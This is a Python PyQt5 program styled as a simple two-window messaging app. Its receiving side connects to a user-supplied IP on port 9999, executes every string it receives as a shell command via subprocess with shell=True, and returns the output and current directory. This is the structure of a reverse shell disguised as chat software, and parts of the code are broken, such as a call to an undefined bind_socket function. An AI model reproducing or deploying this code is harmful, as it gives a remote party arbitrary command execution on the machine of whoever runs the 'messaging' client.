from PyQt5.QtWidgets import *
from PyQt5.QtGui  import  QIcon , QFont , QImage , QPalette , QBrush
from PyQt5.QtCore import QSize
import sys , os
import socket
import time
import subprocess as sb
os.chdir(r'C:\Users\user16\Desktop\png')
class sendmessage(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('shit')
        self.setWindowIcon(QIcon('detective1.png'))
        self.setGeometry(800,100,500,300)
        oImage = QImage("back2.jpg")
        sImage = oImage.scaled(QSize(500,300))                   # resize Image to widgets size
        palette = QPalette()
        palette.setBrush(10, QBrush(sImage))                     # 10 = Windowrole
        self.setPalette(palette)
        self.initwindow()
        self.show()
    def initwindow(self):
        vbox=QVBoxLayout()
        hbox=QHBoxLayout()
        l=QLabel('message :',self)
        l.setStyleSheet('color:red')
        l.setFont(QFont('sanserif',13))
        self.content=QLabel("waiting for connection ")
        self.content.setStyleSheet("color:green")
        self.line=QLineEdit()
        b2=QPushButton("start reciveing")
        b2.clicked.connect(self.recive)
        b=QPushButton("send")
        b.clicked.connect(self.send_commande)

        hbox.addWidget(l)
        hbox.addWidget(self.line)
        vbox.addLayout(hbox)
        vbox.addWidget(b2)
        vbox.addWidget(b)
        vbox.addWidget(self.content)
        self.setLayout(vbox)
    def createsocket(self):
        try :
            self.host=''
            self.port = 9999
            self.s= socket.socket()
        except socket.error as msg:
            print('socket creation error'+str(msg))

    def binding_socket(self):
        try :
            print("binding ...")
            self.s.bind((self.host,self.port))
            self.s.listen(5)
            print("done")
        except socket.error as msg :
            print('socket binding error '+str(msg) +'\n'+'retrying ...')
            bind_socket()
    def socket_accept(self) :
        print("done2")
        self.con,adresse = self.s.accept()
        self.content.setText('connection has been established () IP: {} , port: {}'.format(adresse[0],str(adresse[1])))
    def send_commande(self):
        cmd=self.line.text()
        if cmd=='quit':
            self.con.close()
            self.s.close()
            sys.exit()
        if len(str.encode(cmd))>0 :
            self.con.send(str.encode("echo "+cmd))
            client_reponse = str(self.con.recv(1024),'utf-8')
            self.content.setText(client_reponse)
    def recive(self):
        self.createsocket()
        self.binding_socket()
        self.socket_accept()
class recivemessage(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('shit')
        self.setWindowIcon(QIcon('detective1.png'))
        self.setGeometry(200,100,500,300)
        oImage = QImage("back2.jpg")
        sImage = oImage.scaled(QSize(500,300))                   # resize Image to widgets size
        palette = QPalette()
        palette.setBrush(10, QBrush(sImage))                     # 10 = Windowrole
        self.setPalette(palette)
        self.initwindow()
        self.show()
    def initwindow(self):
        vbox=QVBoxLayout()
        hbox=QHBoxLayout()
        l=QLabel('please enter you destination ip :',self)
        l.setStyleSheet('color:red')
        l.setFont(QFont('sanserif',13))
        self.content=QLabel("waiting for connection ... ")
        self.content.setStyleSheet("color:green")
        self.line=QLineEdit()
        b=QPushButton("Connect")
        b.clicked.connect(self.button)
        b2=QPushButton("recive")
        b2.clicked.connect(self.refresh)
        hbox.addWidget(l)
        hbox.addWidget(self.line)
        vbox.addLayout(hbox)
        vbox.addWidget(b)
        vbox.addWidget(b2)
        vbox.addWidget(self.content)
        self.setLayout(vbox)
    def button(self):
        try :
            self.s=socket.socket()
            host=self.line.text()
            port= 9999
            self.s.connect((host,port))
        except:

            self.content.setText("ip not responding")

    def refresh(self):
            data=self.s.recv(1024)
            if data[:2].decode('utf-8')=='cd':
                os.chdir(data[3:].decode('utf-8'))
            if len(data) > 0:
                cmd= sb.Popen(data[:].decode('utf-8'), shell=True , stdout=sb.PIPE , stdin=sb.PIPE , stderr=sb.PIPE)
                output_bytes=cmd.stdout.read()+cmd.stderr.read()
                output_str = str(output_bytes,'cp1252')
                currentWD = os.getcwd()+' >'
                self.s.send(str.encode(output_str + currentWD))
                self.content.setText(output_str)
app = QApplication(sys.argv)
v=recivemessage()
i=sendmessage()
sys.exit(app.exec_())